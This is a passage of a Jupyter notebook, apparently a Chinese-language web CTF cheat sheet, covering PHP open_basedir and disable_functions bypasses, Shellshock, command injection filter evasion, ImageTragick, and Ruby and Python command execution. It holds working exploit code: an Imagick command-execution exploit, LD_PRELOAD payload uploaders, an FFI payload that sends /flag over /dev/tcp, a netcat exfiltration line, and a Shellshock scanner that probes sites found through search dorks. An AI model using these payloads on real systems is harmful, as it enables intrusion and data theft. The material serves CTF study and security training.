    "所以在某些條件下可透過上傳覆蓋暫存文件來寫webshell\n",
    "\n",
    "system_id要和目標機器一樣\n",
    "timestamp要一致\n",
    "https://github.com/GoSecure/php7-opcache-override\n",
    "\n",
    "Disassembler可以把Byte code轉成Pseudo code\n",
    "Example\n",
    "\n",
    "0CTF 2018 Qual - EzDoor\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### PCRE回溯次數限制繞過"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "PHP的PCRE庫使用NFA作為正規表達式引擎\n",
    "NFA在匹配不上時，會回溯嘗試其他狀態\n",
    "\n",
    "PHP為防止DOS，設定了PCRE回溯次數上限\n",
    "pcre.backtrack_limit\n",
    "預設為1000000\n",
    "\n",
    "回溯次數超過上限時，preg_match()會返回false\n",
    "\n",
    "Example\n",
    "Code-Breaking Puzzles - pcrewaf"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### open_basedir繞過"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### glob 列目錄"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "$file_list = array();\n",
    "$it = new DirectoryIterator(\"glob:///*\");\n",
    "foreach($it as $f) {  \n",
    "    $file_list[] = $f->__toString();\n",
    "}\n",
    "sort($file_list);  \n",
    "foreach($file_list as $f){  \n",
    "    echo \"{$f}<br/>\";\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### phuck3"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "chdir('img');\n",
    "ini_set('open_basedir','..');\n",
    "chdir('..');chdir('..');\n",
    "chdir('..');chdir('..');\n",
    "ini_set('open_basedir','/');\n",
    "echo(file_get_contents('flag'));"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### symlinks"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "mkdir('/var/www/html/a/b/c/d/e/f/g/',0777,TRUE);\n",
    "symlink('/var/www/html/a/b/c/d/e/f/g','foo');\n",
    "ini_set('open_basedir','/var/www/html:bar/');\n",
    "symlink('foo/../../../../../../','bar');\n",
    "unlink('foo');\n",
    "symlink('/var/www/html/','foo');\n",
    "echo file_get_contents('bar/etc/passwd');"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Fastcgi"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "https://github.com/w181496/CTF/tree/master/0ctf2019_qual/WallbreakerEasy"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### disable_functions繞過"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### bash shellshock"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "env -i X='() { (a)=>\\' bash -c 'echo date'; cat echo bash: X:\n",
    "line 1: syntax error near unexpected token `=' bash: X: line 1: `' bash: error importing function definition for `X' Sun Oct 12 23:16:36 EDT 2014 \n",
    "###date 被作为命令执行表示漏洞存在###\n",
    "\n",
    "env -i X='() { (a)=>\\' bash -c 'echo date'; cat echo date cat:\n",
    "echo: No such file or directory ##同前面，输出date 表示修复成功##\n",
    "\n",
    "env x=’() { :;}; echo vulnerable’ bash -c “echo this is a test”\n",
    "如果出现vulnerable this is a test表示存在该漏洞。\n"
   ]
  },
  {
   "attachments": {
    "%E5%9B%BE%E7%89%87.png": {
     "image/png": "[encoded data removed]"
    }
   },
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "![%E5%9B%BE%E7%89%87.png](attachment:%E5%9B%BE%E7%89%87.png)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "#coding=utf-8\n",
    "import requests\n",
    "import json\n",
    "import sys\n",
    "import threading\n",
    "import socket\n",
    "vul_res = []\n",
    "class GoogleURLProvider():\n",
    "    def __init__(self,pageCount,proxies):\n",
    "        self.pageCount = pageCount #查询的页数\n",
    "        self.keywords = r'inurl:cgi-bin filetype:sh'\n",
    "        self.apiurl = \"https://ajax.googleapis.com/ajax/services/search/web\"\n",
    "        self.proxies = proxies\n",
    "    def getRequest(self,url):\n",
    "        return requests.get(url,proxies=self.proxies,verify=False)\n",
    "\n",
    "    def getUrls(self):\n",
    "        ret_list = []\n",
    "        tmp_list = []\n",
    "        for x in xrange(0,self.pageCount):\n",
    "            url = \"{apiurl}?v=1.0&q={keywords}&rsz=8&start={pageCount}\".format(apiurl=self.apiurl,keywords=self.keywords,pageCount=x)\n",
    "            try:\n",
    "                r = self.getRequest(url)\n",
    "                results = json.loads(r.text)\n",
    "                if not results:\n",
    "                    continue\n",
    "                infos = results['responseData']['results']\n",
    "                if infos:\n",
    "                    for i in infos:\n",
    "                        tmp_list.append(i['url'])\n",
    "            except Exception, e:\n",
    "                continue\n",
    "        ret_list = ret_list + tmp_list\n",
    "        return ret_list\n",
    " \n",
    "class BashRCEDetector():\n",
    "    def __init__(self,urls):\n",
    "\n",
    "        self.urls = urls\n",
    "    def detector(self):\n",
    "        global vul_res\n",
    "\n",
    "        for x in self.urls:\n",
    "            #多线程执行\n",
    "            each = EachWorker(x)\n",
    "            each.start()\n",
    "            each.join()\n",
    " \n",
    " \n",
    "'''线程工作类'''\n",
    "class EachWorker(threading.Thread):\n",
    "    def __init__(self,url):\n",
    "        threading.Thread.__init__(self)\n",
    "        self.url = url\n",
    "    def run(self):\n",
    "        global vul_res\n",
    "        useragent_header = {\n",
    "            'User-Agent':'''() { 1;}; echo 'eee'''\n",
    "        }\n",
    "        try:\n",
    "            r = requests.get(self.url,headers = useragent_header,timeout=8)\n",
    "            if r.status_code == 500:\n",
    "                print \"{url} has Bash RCE vulnerability\".format(url=self.url)\n",
    "                vul_res.append(self.url)\n",
    "            else:\n",
    "                pass\n",
    "        except socket.timeout, e:\n",
    "            pass\n",
    "        except requests.exceptions.Timeout, e:\n",
    "            pass\n",
    "        except requests.exceptions.ConnectionError, e:\n",
    "            pass\n",
    " \n",
    " \n",
    "if __name__ == '__main__':\n",
    "    print 'Powered by:Exploit QQ:739858341'\n",
    "    print 'This is a program which you can use to scan the BashRCE vulnerability\\nScanner working,please wait....'\n",
    "    if len(sys.argv) != 2:\n",
    "        print 'Usage:python BashRCEScanner <google pageCount>'\n",
    "        sys.exit()\n",
    "    #goagent proxy\n",
    "    #在这里修改，加入你自己的代理即可使用\n",
    "    proxies = {\n",
    "    'http':\"http://127.0.0.1:8087\",\n",
    "    'https':\"http://127.0.0.1:8087\"\n",
    "    }\n",
    "    url_res = []\n",
    "    vul_guys = []\n",
    "    urlgetter = GoogleURLProvider(int(sys.argv[1]),proxies)\n",
    "    url_res = urlgetter.getUrls()\n",
    "\n",
    "    bash_detector = BashRCEDetector(url_res)\n",
    "    bash_detector.detector()\n",
    "    if len(vul_res) == 0:\n",
    "        print 'This group have no vulnerability'\n",
    "    else:\n",
    "        print 'Find %d poor host(s)' % len(vul_res)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### mail()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "sendmail\n",
    "putenv寫LD_PRELOAD\n",
    "trick: https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### imap_open()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "<?php\n",
    "$payload = \"echo hello|tee /tmp/executed\";\n",
    "$encoded_payload = base64_encode($payload);\n",
    "$server = \"any -o ProxyCommand=echo\\t\".$encoded_payload.\"|base64\\t-d|bash\";\n",
    "@imap_open('{'.$server.'}:143/imap}INBOX', '', '');"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### error_log()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "第二個參數message_type為1時，會去調用sendmail"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### ImageMagick"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Command Injection"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Exploit Title: PHP Imagick disable_functions Bypass\n",
    "# Date: 2016-05-04\n",
    "# Exploit Author: RicterZ (ricter@chaitin.com)\n",
    "# Vendor Homepage: https://pecl.php.net/package/imagick\n",
    "# Version: Imagick  <= 3.3.0 PHP >= 5.4\n",
    "# Test on: Ubuntu 12.04\n",
    "\n",
    "# Exploit:\n",
    "\n",
    "<?php\n",
    "# PHP Imagick disable_functions Bypass\n",
    "# Author: Ricter <ricter@chaitin.com>\n",
    "#\n",
    "# $ curl \"127.0.0.1:8080/exploit.php?cmd=cat%20/etc/passwd\"\n",
    "# <pre>\n",
    "# Disable functions: exec,passthru,shell_exec,system,popen\n",
    "# Run command: cat /etc/passwd\n",
    "# ====================\n",
    "# root:x:0:0:root:/root:/usr/local/bin/fish\n",
    "# daemon:x:1:1:daemon:/usr/sbin:/bin/sh\n",
    "# bin:x:2:2:bin:/bin:/bin/sh\n",
    "# sys:x:3:3:sys:/dev:/bin/sh\n",
    "# sync:x:4:65534:sync:/bin:/bin/sync\n",
    "# games:x:5:60:games:/usr/games:/bin/sh\n",
    "# ...\n",
    "# </pre>\n",
    "echo \"Disable functions: \" . ini_get(\"disable_functions\") . \"\\n\";\n",
    "$command = isset($_GET['cmd']) ? $_GET['cmd'] : 'id';\n",
    "echo \"Run command: $command\\n====================\\n\";\n",
    "\n",
    "$data_file = tempnam('/tmp', 'img');\n",
    "$imagick_file = tempnam('/tmp', 'img');\n",
    "\n",
    "$exploit = <<<EOF\n",
    "push graphic-context\n",
    "viewbox 0 0 640 480\n",
    "fill 'url(https://127.0.0.1/image.jpg\"|$command>$data_file\")'\n",
    "pop graphic-context\n",
    "EOF;\n",
    "\n",
    "file_put_contents(\"$imagick_file\", $exploit);\n",
    "$thumb = new Imagick();\n",
    "$thumb->readImage(\"$imagick_file\");\n",
    "$thumb->writeImage(tempnam('/tmp', 'img'));\n",
    "$thumb->clear();\n",
    "$thumb->destroy();\n",
    "\n",
    "echo file_get_contents($data_file);\n",
    "?>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "LD_PRELOAD + ghostscript:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "Imagemagick會用ghostscript去parse eps\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "#!/usr/bin/env python3\n",
    "import requests\n",
    "import base64\n",
    "\n",
    "def b64(x):\n",
    "    return base64.b64encode(x).decode()\n",
    "\n",
    "# https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD/ \n",
    "# https://github.com/TarlogicSecurity/Chankro/\n",
    "b = b64(open('./bypass_disablefunc_x64.so','rb').read())\n",
    "s = requests.session()\n",
    "\n",
    "payload = f'''\n",
    "file_put_contents(\"/tmp/bcdcdfaed8c5764fc9c7215e95196e96/a.eps\", \"%EPS\");\n",
    "file_put_contents(\"/tmp/bcdcdfaed8c5764fc9c7215e95196e96/a.so\", base64_decode(\"{b}\"));\n",
    "var_dump(glob('/tmp/bcdcdfaed8c5764fc9c7215e95196e96/*'));\n",
    "'''\n",
    "r = s.post('http://111.186.63.208:31340/', data=dict(backdoor=payload))\n",
    "print(r.text)\n",
    "\n",
    "\n",
    "payload = '''\n",
    "putenv(\"EVIL_CMDLINE=sh -c /readflag$IFS>$IFS/tmp/bcdcdfaed8c5764fc9c7215e95196e96/pwn\");\n",
    "putenv(\"LD_PRELOAD=/tmp/bcdcdfaed8c5764fc9c7215e95196e96/a.so\");\n",
    "new Imagick(\"/tmp/bcdcdfaed8c5764fc9c7215e95196e96/a.eps\");\n",
    "var_dump(glob('/tmp/bcdcdfaed8c5764fc9c7215e95196e96/*'));\n",
    "var_dump(file_get_contents('/tmp/bcdcdfaed8c5764fc9c7215e95196e96/pwn'));\n",
    "'''\n",
    "r = s.post('http://111.186.63.208:31340/', data=dict(backdoor=payload))\n",
    "print(r.text)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### LD_PRELOAD + ffpmeg"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "strace -fi -e execve convert test.mpeg out.png [00007f6514f18647] execve(“/usr/bin/convert”, [“convert”, “test.mpeg”, “out.png”], [/* 25 vars /]) = 0 strace: Process 4350 attached [pid 4350] [00007f6e5aaf8647] execve(“/bin/sh”, [“sh”, “-c”, “‘ffmpeg’ -nostdin -v -1 -i ‘/tmp”…], [/ 25 vars /]) = 0 strace: Process 4351 attached [pid 4351] [00007fc8f4b18647] execve(“/usr/bin/ffmpeg”, [“ffmpeg”, “-nostdin”, “-v”, “-1”, “-i”, “/tmp/magick-4349DGSUOJxzoklJ”, “-vframes”, “2147483647”, “-vcodec”, “pam”, “-an”, “-f”, “rawvideo”, “-y”, “/tmp/magick-4349oLhLxfW7jzlm.pam”], [/ 25 vars */]) = 0 …\n",
    "        \n",
    "        "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### MAGICK_CODER_MODULE_PATH"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "https://github.com/mo-xiaoxi/CTF_Web_docker/tree/master/TCTF2019/Wallbreaker_Easy"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### MAGICK_CONFIGURE_PATH"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "https://xz.aliyun.com/t/4688#toc-14"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "delegates.xml定義處理各種文件的規則\n",
    "可以用putenv寫掉設定檔路徑\n",
    "首先通过正常情况下执行的命令找到 EPT 文件对应的文件格式为：ps:alpha，那么我们所需要的delegates.xml内容就是：\n",
    "\n",
    "<delegatemap>\n",
    "  <delegate decode=\"ps:alpha\" command=\"sh -c &quot;/readflag > /tmp/3accb9900a8be5421641fb31e6861f33/flag.txt&quot;\"/>\n",
    "</delegatemap>\n",
    "将 delegates.xml 和 EPT 文件写入后，使用题目中的后门执行如下命令即可：\n",
    "\n",
    "putenv('MAGICK_CONFIGURE_PATH=/tmp/3accb9900a8be5421641fb31e6861f33');\n",
    "$img = new Imagick('/tmp/3accb9900a8be5421641fb31e6861f33/1.ept');\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### 蓋PATH + ghostscript:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "#造一個執行檔gs\n",
    "#include <stdlib.h>\n",
    "#include <string.h>\n",
    "int main() {\n",
    "    unsetenv(\"PATH\");\n",
    "    const char* cmd = getenv(\"CMD\");\n",
    "    system(cmd);\n",
    "    return 0;\n",
    "}\n",
    "\n",
    "##\n",
    "putenv('PATH=/tmp/mydir');\n",
    "putenv('CMD=/readflag > /tmp/mydir/output');\n",
    "chmod('/tmp/mydir/gs','0777');\n",
    "$img = new Imagick('/tmp/mydir/1.ept');\n",
    "\n",
    "\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### dl()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "載入module\n",
    "dl(\"rce.so\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### FFI"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "After phpinfo();, you can easily notice the PHP version contains -dev, and you will find a strange extension ffi is enabled. It's a new feature in PHP 7.4.\n",
    "\n",
    "Just read these 3 RFCs for PHP 7.4 and write your own payload:\n",
    "\n",
    "PHP RFC: Preloading https://wiki.php.net/rfc/preload\n",
    "PHP RFC: FFI - Foreign Function Interface https://wiki.php.net/rfc/ffi\n",
    "PHP RFC: New custom object serialization mechanism https://wiki.php.net/rfc/custom_object_serialization\n",
    "In principle, this makes existing strings serialized in O format fully interoperable with the new serialization mechanism, the data is just provided in a different way (for __wakeup() in properties, for __unserialize() as an explicit array). If a class has both __sleep() and __serialize(), then the latter will be preferred. If a class has both __wakeup() and __unserialize() then the latter will be preferred.\n",
    "\n",
    "If a class both implements Serializable and __serialize()/__unserialize(), then serialization will prefer the new mechanism, while unserialization can make use of either, depending on whether the C (Serializable) or O (__unserialize) format is used. As such, old serialized strings encoded in C format can still be decoded, while new strings will be produced in O format.\n",
    "\n",
    "Payload"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "class D implements Serializable {\n",
    "    protected $data = [\n",
    "        'ret' => null,\n",
    "        'func' => 'FFI::cdef',\n",
    "        'arg' => 'int system(const char *command);'\n",
    "    ];\n",
    "\n",
    "    public function serialize (): string {\n",
    "        return serialize($this->data);\n",
    "    }\n",
    "\n",
    "    public function unserialize($payload) {\n",
    "        $this->data = unserialize($payload);\n",
    "    }\n",
    "}\n",
    "\n",
    "$a = new D();\n",
    "$b = serialize($a);\n",
    "$b = str_replace('\"D\"', '\"A\"', $b);\n",
    "$d = unserialize($b);\n",
    "$d->ret->system('bash -c \"cat /flag > /dev/tcp/xxx/xxx\"');"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Extension"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "https://github.com/w181496/FuckFastcgi"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### l3mon/Bypass_Disable_functions_Shell"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "https://github.com/l3m0n/Bypass_Disable_functions_Shell"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### JSON UAF Bypass"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "7.1 - all versions to date\n",
    "7.2 < 7.2.19 (released: 30 May 2019)\n",
    "7.3 < 7.3.6 (released: 30 May 2019)\n",
    "\n",
    "\n",
    "https://github.com/mm0r1/exploits/tree/master/php-json-bypass"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### GC Bypass"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "7.0 - all versions to date\n",
    "7.1 - all versions to date\n",
    "7.2 - all versions to date\n",
    "7.3 - all versions to date\n",
    "\n",
    "https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Backtrace Bypass"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "7.0 - all versions to date\n",
    "7.1 - all versions to date\n",
    "7.2 - all versions to date\n",
    "7.3 - all versions to date\n",
    "7.4 - all versions to date\n",
    "\n",
    "https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 其他"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "大小寫不敏感\n",
    "<?PhP sYstEm(ls);\n",
    "\n",
    "\n",
    "echo (true ? 'a' : false ? 'b' : 'c');\n",
    "b\n",
    "\n",
    "echo `whoami`;\n",
    "kaibro\n",
    "\n",
    "\n",
    "正規表達式.不匹配換行字元%0a\n",
    "\n",
    "\n",
    "\n",
    "\n",
    "正規表達式常見誤用:\n",
    "preg_match(\"/\\\\/\", $str)\n",
    "匹配反斜線應該要用\\\\\\\\而不是\\\\\n",
    "\n",
    "\n",
    "運算優先權問題\n",
    "$a = true && false;\n",
    "$a => false\n",
    "$a = true and false;\n",
    "$a => true\n",
    "\n",
    "chr()\n",
    "大於256會mod 256\n",
    "小於0會加上256的倍數，直到>0\n",
    "Example:\n",
    "chr(259) === chr(3)\n",
    "chr(-87) === chr(169)\n",
    "\n",
    "\n",
    "遞增\n",
    "$a=\"9D9\"; var_dump(++$a);\n",
    "string(3) \"9E0\"\n",
    "$a=\"9E0\"; var_dump(++$a);\n",
    "float(10)\n",
    "\n",
    "\n",
    "算數運算繞Filter\n",
    "%f3%f9%f3%f4%e5%ed & %7f%7f%7f%7f%7f%7f\n",
    "system\n",
    "可用在限制不能出現英數字時 or 過濾某些特殊符號\n",
    "$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`');\n",
    "assert\n",
    "其他\n",
    "~, ++等運算，也都可用類似概念構造\n",
    "\n",
    "\n",
    "花括號\n",
    "陣列、字串元素存取可用花括號\n",
    "$array{index}同$array[index]\n",
    "\n",
    "\n",
    "filter_var\n",
    "\n",
    "filter_var('http://evil.com;google.com', FILTER_VALIDATE_URL)\n",
    "False\n",
    "\n",
    "filter_var('0://evil.com;google.com', FILTER_VALIDATE_URL)\n",
    "True\n",
    "\n",
    "filter_var('\"aaaaa{}[]()\\'|!#$%*&^-_=+`,.\"@b.c',FILTER_VALIDATE_EMAIL)\n",
    "\"aaaaa{}[]()'|!#$%*&^-_=+,.\"@b.c` (OK)\n",
    "\n",
    "filter_var('aaa.\"bbb\"@b.c',FILTER_VALIDATE_EMAIL)\n",
    "aaa.\"bbb\"@b.c (OK)\n",
    "\n",
    "filter_var('aaa\"bbb\"@b.c',FILTER_VALIDATE_EMAIL)\n",
    "False\n",
    "\n",
    "\n",
    "json_decode\n",
    "\n",
    "不直接吃換行字元和\\t字元\n",
    "但可以吃'\\n'和'\\t'\n",
    "會轉成換行字元和Tab\n",
    "也吃\\uxxxx形式\n",
    "json_decode('{\"a\":\"\\u0041\"}')\n",
    "\n",
    "\n",
    "=== bug\n",
    "\n",
    "var_dump([0 => 0] === [0x100000000 => 0])\n",
    "某些版本會是True\n",
    "ASIS 2018 Qual Nice Code\n",
    "https://3v4l.org/sUEMG\n",
    "    \n",
    "openssl_verify\n",
    "\n",
    "預測採用SHA1來做簽名，可能有SHA1 Collision問題\n",
    "e.g. DEFCON CTF 2018 Qual - EasyPisy\n",
    "https://github.com/w181496/CTF/tree/master/defcon2018-qual/EasyPisy\n",
    "\n",
    "\n",
    "Namespace\n",
    "\n",
    "PHP的預設Global space是\\\n",
    "e.g. \\system('ls');\n",
    "\n",
    "\n",
    "\n",
    "\n",
    "basename (php bug 62119)\n",
    "\n",
    "basename(\"index.php/config.php/喵\")\n",
    "config.php\n",
    "Example: zer0pts CTF 2020 - Can you guess it?\n",
    "https://github.com/w181496/CTF/tree/master/zer0pts2020/can_you_guess_it\n",
    "\n",
    "    \n",
    "    \n",
    "strip_tags (php bug 78814)\n",
    "\n",
    "php version <= 7.4.0\n",
    "strip_tags(\"<s/trong>b</strong>\", \"<strong>\")\n",
    "<s/trong>b</strong>\n",
    "https://github.com/w181496/CTF/tree/master/zer0pts2020/MusicBlog\n",
    "    \n",
    "    \n",
    "    "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Command Injection"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "| cat flag\n",
    "&& cat flag\n",
    "; cat flag\n",
    "%0a cat flag\n",
    "\"; cat flag\n",
    "`cat flag`\n",
    "cat $(ls)\n",
    "\"; cat $(ls)\n",
    "`cat flag | nc kaibro.tw 5278`\n",
    "\n",
    ". flag\n",
    "PS1=$(cat flag)\n",
    "\n",
    "`echo${IFS}${PATH}|cut${IFS}-c1-1`\n",
    "=> /\n",
    "\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## ? and *"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "? match one character\n",
    "cat fl?g\n",
    "/???/??t /???/p??s??\n",
    "* match 多個\n",
    "cat f*\n",
    "cat f?a*"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 空白繞過"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "${IFS}\n",
    "cat${IFS}flag\n",
    "ls$IFS-alh\n",
    "cat$IFS$2flag\n",
    "cat</etc/passwd\n",
    "{cat,/etc/passwd}\n",
    "X=$'cat\\x20/etc/passwd'&&$X\n",
    "IFS=,;`cat<<<uname,-a`\n",
    "bash only"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Keyword繞過"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "String Concat\n",
    "\n",
    "A=fl;B=ag;cat $A$B\n",
    "\n",
    "\n",
    "Empty Variable\n",
    "\n",
    "cat fl${x}ag\n",
    "cat tes$(z)t/flag\n",
    "\n",
    "\n",
    "\n",
    "Environment Variable\n",
    "\n",
    "$PATH => \"/usr/local/….blablabla”\n",
    "${PATH:0:1} => '/'\n",
    "${PATH:1:1} => 'u'\n",
    "${PATH:0:4} => '/usr'\n",
    "${PS2}\n",
    ">\n",
    "${PS4}\n",
    "+\n",
    "\n",
    "\n",
    "Empty String\n",
    "\n",
    "cat fl\"\"ag\n",
    "cat fl''ag\n",
    "cat \"fl\"\"ag\"\n",
    "\n",
    "\n",
    "反斜線\n",
    "\n",
    "c\\at fl\\ag"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## ImageMagick (ImageTragick)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "CVE-2016-3714\n",
    "mvg格式包含https處理(使用curl下載)，可以閉合雙引號\n",
    "payload:\n",
    "push graphic-context\n",
    "viewbox 0 0 640 480\n",
    "fill 'url(https://kaibro.tw\";ls \"-la)'\n",
    "pop graphic-context"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Ruby Command Executing"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "open(\"| ls\")\n",
    "IO.popen(\"ls\").read\n",
    "Kernel.exec(\"ls\")\n",
    "`ls`\n",
    "system(\"ls\")\n",
    "\n",
    "eval(\"ruby code\")\n",
    "Non-Alphanumeric example: HITCON CTF 2015 - Hard to say\n",
    "$$/$$ => 1\n",
    "'' << 97 << 98 << 99 => \"abc\"\n",
    "$:即$LOAD_PATH\n",
    "    \n",
    "exec(\"ls\")\n",
    "%x{ls}\n",
    "\n",
    "\n",
    "\n",
    "Net::FTP\n",
    "CVE-2017-17405\n",
    "use Kernel#open"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Python Command Executing"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "os.system(\"ls\")\n",
    "os.popen(\"ls\").read()\n",
    "os.execl(\"/bin/ls\",\"\")\n",
    "os.execlp(\"ls\",\"\")\n",
    "os.execv(\"/bin/ls\",[''])\n",
    "os.execvp(\"/bin/ls\",[\"\"])\n",
    "\n",
    "subprocess.call(\"ls\")\n",
    "subprocess.call(\"ls|cat\",shell=False) => Fail\n",
    "subprocess.call(\"ls|cat\",shell=True) => Correct\n",
    "\n",
    "\n",
    "eval(\"__import__('os').system('ls')\")\n",
    "exec(\"__import__('os').system('ls')\")\n",
    "commands.getoutput('ls')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Read File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "diff /etc/passwd /flag\n",
    "paste /flag\n",
    "bzmore /flag\n",
    "bzless /flag\n",
    "static-sh /flag\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# SQL Injection"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## MySQL"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 子字串"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "substr(\"abc\",1,1) => 'a'\n",
    "mid(\"abc\", 1, 1) => 'a'"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Ascii function"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "ascii('A') => 65"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Char function"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "char(65) => 'a'"
   ]
  },
  {
   "cell_type": "markdown",
